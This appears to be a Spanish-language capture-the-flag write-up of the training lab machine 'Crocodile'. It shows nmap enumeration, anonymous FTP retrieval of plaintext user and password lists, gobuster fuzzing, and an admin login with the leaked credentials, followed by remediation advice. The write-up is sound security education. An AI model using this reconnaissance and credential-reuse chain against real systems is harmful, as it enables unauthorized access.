---
categories:
  - "[[Ciber]]"
tags:
  - vms
  - pentesting
  - starting-point
  - ftp
  - apache
  - gobuster
  - credentials-leak
created: 2026-03-13
---

## 1. Información General

- **Máquina:** Crocodile
- **IP:** 10.129.17.26
- **SO:** Linux (Ubuntu)
- **Dificultad:** Muy fácil
- **Fecha:** 13/03/2026

## 2. Resumen Ejecutivo

Se comprometió un servidor web Apache explotando una fuga de credenciales en un servicio FTP anónimo expuesto. El servidor FTP `vsftpd` permitía acceso de lectura sin autenticación, exponiendo listas de usuarios y contraseñas administrativas. Mediante fuzzing web con Gobuster se descubrió un panel de administración `login.php`, en el cual se validaron las credenciales extraídas (`admin:rKXM59ESxesUFHAd`), obteniendo acceso administrativo y la flag del sistema.

## 3. Enumeración (Reconocimiento)

### Escaneo de Puertos y Servicios con Nmap

```bash
nmap -sC -sV 10.129.17.26
```

**Salida relevante:**

```text
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| -rw-r--r--    1 ftp      ftp            33 Jun 08  2021 allowed.userlist
|_-rw-r--r--    1 ftp      ftp            62 Apr 20  2021 allowed.userlist.passwd
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Smash - Bootstrap Business Template
```

## 4. Explotación (Acceso Inicial)

### Acceso FTP Anónimo & Extracción de Ficheros

Conectamos como usuario `anonymous` al servidor FTP para inspeccionar los ficheros públicos:

```bash
ftp anonymous@10.129.17.26
ftp> ls
-rw-r--r-- 1 ftp ftp 33 Jun 08 2021 allowed.userlist
-rw-r--r-- 1 ftp ftp 62 Apr 20 2021 allowed.userlist.passwd
ftp> get allowed.userlist
ftp> get allowed.userlist.passwd
ftp> exit
```

Inspección del contenido descargado:

```text
# allowed.userlist
aron
pwnmeow
egotisticalsw
admin

# allowed.userlist.passwd
root
Supersecretpassword1
@BaASD&9032123sADS
rKXM59ESxesUFHAd
```

### Fuzzing de Directorios Web (Gobuster)

Dado que la página principal solo exponía una plantilla HTML sin enlaces dinámicos, se procedió a buscar recursos ocultos y paneles de autenticación:

```bash
gobuster dir -u http://10.129.17.26 -x php,html -w /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt
```

**Resultado:**
- `/login.php` (Status: 200 OK)

### Acceso al Panel de Administración

Navegando a `http://10.129.17.26/login.php`, se introdujo el usuario `admin` junto con la contraseña `rKXM59ESxesUFHAd`. El acceso fue concedido inmediatamente, mostrando la flag en el panel principal:

![[Screenshot-PHP-Crocodile.png]]

## 5. Lecciones Aprendidas & Remediación

- **Deshabilitar FTP Anónimo:** En `vsftpd.conf`, configurar `anonymous_enable=NO` para evitar la lectura pública de archivos internos.
- **Protección de Credenciales:** Las credenciales y listas de cuentas nunca deben residir en texto plano en directorios compartidos o de acceso público.
- **Seguridad en Paneles Web:** Implementar autenticación multifactor (MFA), bloqueo de intentos repetidos (Rate Limiting) y ocultar rutas de administración detrás de VPN corporativa.
